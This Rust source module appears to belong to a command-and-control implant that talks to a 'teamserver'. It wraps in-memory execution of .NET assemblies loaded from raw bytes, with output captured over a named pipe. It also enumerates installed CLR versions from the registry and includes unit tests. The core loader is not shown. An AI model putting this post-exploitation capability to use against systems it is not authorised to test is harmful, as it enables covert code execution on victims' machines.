/// On Windows, loads mscoree.dll and oleaut32.dll at runtime, walks COM vtables
/// to initialise the CLR, creates an AppDomain, loads the assembly, and invokes
/// its entry point.  Stdout is captured via the named pipe at `pipe_name`.
///
/// On non-Windows, returns [`DOTNET_INFO_FAILED`] immediately.
///
/// # Arguments
///
/// * `pipe_name` — Named pipe path for stdout capture (e.g. `\\.\pipe\xyz`).
/// * `app_domain` — AppDomain name.
/// * `net_version` — Target CLR version string (e.g. `"v4.0.30319"`).
/// * `assembly_data` — Raw .NET PE bytes.
/// * `assembly_args` — Command-line arguments for the assembly.
#[cfg(windows)]
pub fn dotnet_execute(
    pipe_name: &str,
    app_domain: &str,
    net_version: &str,
    assembly_data: &[u8],
    assembly_args: &str,
) -> DotnetResult {
    clr::execute(pipe_name, app_domain, net_version, assembly_data, assembly_args)
}

/// On non-Windows targets, .NET assembly execution is unsupported.
#[cfg(not(windows))]
pub fn dotnet_execute(
    _pipe_name: &str,
    _app_domain: &str,
    _net_version: &str,
    _assembly_data: &[u8],
    _assembly_args: &str,
) -> DotnetResult {
    warn!(".NET assembly execution is only supported on Windows");
    DotnetResult {
        callbacks: vec![DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() }],
        output: Vec::new(),
    }
}

/// Enumerate installed CLR versions.
///
/// On Windows, checks well-known registry keys that indicate installed .NET
/// Framework versions.  Returns version strings (e.g. `"v4.0.30319"`).
///
/// On non-Windows, returns an empty list.
#[cfg(windows)]
#[allow(unsafe_code)]
pub fn enumerate_clr_versions() -> Vec<String> {
    let mut versions = Vec::new();

    // Check for .NET Framework 4.x via registry
    // HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
    let subkey = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\0";
    let mut hkey: isize = 0;

    // SAFETY: calling RegOpenKeyExA to read registry.
    let status = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey,
        )
    };

    if status == 0 {
        let value_name = b"Version\0";
        let mut buf = [0u8; 256];
        let mut buf_len: u32 = buf.len() as u32;
        let mut value_type: u32 = 0;

        let read_status = unsafe {
            windows_sys::Win32::System::Registry::RegQueryValueExA(
                hkey,
                value_name.as_ptr(),
                std::ptr::null(),
                &mut value_type,
                buf.as_mut_ptr(),
                &mut buf_len,
            )
        };

        if read_status == 0 && buf_len > 0 {
            let end = buf_len as usize;
            let version_str = String::from_utf8_lossy(
                &buf[..end.saturating_sub(1)], // strip null terminator
            )
            .to_string();
            if !version_str.is_empty() {
                versions.push(format!("v{version_str}"));
            }
        }

        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey);
        }
    }

    // Check for .NET 3.5
    let subkey_35 = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\0";
    let mut hkey_35: isize = 0;
    let status_35 = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey_35.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey_35,
        )
    };
    if status_35 == 0 {
        versions.push("v3.5".to_string());
        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey_35);
        }
    }

    // Check for .NET 2.0
    let subkey_20 = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\0";
    let mut hkey_20: isize = 0;
    let status_20 = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey_20.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey_20,
        )
    };
    if status_20 == 0 {
        versions.push("v2.0.50727".to_string());
        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey_20);
        }
    }

    versions
}

/// On non-Windows, no CLR versions are available.
#[cfg(not(windows))]
pub fn enumerate_clr_versions() -> Vec<String> {
    Vec::new()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// On non-Windows the stub returns a single FAILED callback.
    #[cfg(not(windows))]
    #[test]
    fn non_windows_dotnet_returns_failed() {
        let result = dotnet_execute("pipe", "domain", "v4.0.30319", b"MZ\x90\x00", "args");
        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].info_id, DOTNET_INFO_FAILED);
    }

    #[cfg(not(windows))]
    #[test]
    fn non_windows_enumerate_returns_empty() {
        assert!(enumerate_clr_versions().is_empty());
    }

    #[test]
    fn dotnet_info_constants_match_teamserver() {
        assert_eq!(DOTNET_INFO_PATCHED, 1);
        assert_eq!(DOTNET_INFO_NET_VERSION, 2);
        assert_eq!(DOTNET_INFO_ENTRYPOINT_EXECUTED, 3);
        assert_eq!(DOTNET_INFO_FINISHED, 4);
        assert_eq!(DOTNET_INFO_FAILED, 5);
    }

    #[cfg(not(windows))]
    #[test]
    fn parse_assembly_args_empty() {
        // Can't call clr::parse_assembly_args on non-Windows since it's
        // inside cfg(windows), but we test the public API path.
        let result = dotnet_execute("pipe", "domain", "v4.0.30319", b"MZ", "");
        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].info_id, DOTNET_INFO_FAILED);
    }

    /// Windows CLR integration test — only runs on actual Windows with .NET
    /// Framework installed.  Validates that the CLR initialisation path does
    /// not crash and returns appropriate callbacks.
    #[cfg(windows)]
    #[test]
    fn windows_dotnet_empty_assembly_returns_failed() {
        // Empty/garbage assembly bytes should fail at Load_3.
        let result = dotnet_execute(
            "\\\\.\\pipe\\specter_test_dotnet",
            "SpecterTest",
            "v4.0.30319",
            b"",
            "",
        );
        // Should have at least one callback.
        assert!(!result.callbacks.is_empty());
        // With empty assembly data, we expect failure somewhere in the chain.
        let last = result.callbacks.last().expect("non-empty callbacks");
        assert!(
            last.info_id == DOTNET_INFO_FAILED || last.info_id == DOTNET_INFO_FINISHED,
            "unexpected final callback: {}",
            last.info_id
        );
    }
}
